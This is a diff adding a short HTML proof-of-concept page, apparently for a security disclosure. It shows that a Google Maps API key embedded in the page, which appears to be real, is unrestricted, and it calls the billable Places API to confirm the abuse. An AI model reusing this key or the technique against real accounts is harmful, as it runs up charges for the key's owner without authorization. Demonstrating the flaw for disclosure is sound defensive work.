@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC: Unrestricted API Key Abuse</title>
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAP9Wa9ATduqP-sOu3NFacCRoqYfPck4_o&libraries=places&callback=initMap" async defer></script>
+    <style>#map { height: 400px; width: 100%; }</style>
+    <script>
+        function initMap() {
+            const map = new google.maps.Map(document.getElementById("map"), {
+                center: { lat: 38.8977, lng: -77.0365 },
+                zoom: 14
+            });
+            // This confirms the "Places" API (a billable SKU) is also unrestricted
+            const service = new google.maps.places.PlacesService(map);
+            service.getDetails({ placeId: 'ChIJN5Nz71W3j4ARhx5bwpTQEGg' }, (place, status) => {
+                if (status === google.maps.places.PlacesServiceStatus.OK) {
+                    document.getElementById('status').innerText = "SUCCESS: Premium Data Loaded for " + place.name;
+                    document.getElementById('status').style.color = "red";
+                }
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Security Proof of Concept</h1>
+    <p>Origin: <script>document.write(window.location.hostname)</script></p>
+    <div id="status">Testing API Key Restrictions...</div>
+    <div id="map"></div>
+</body>
+</html>
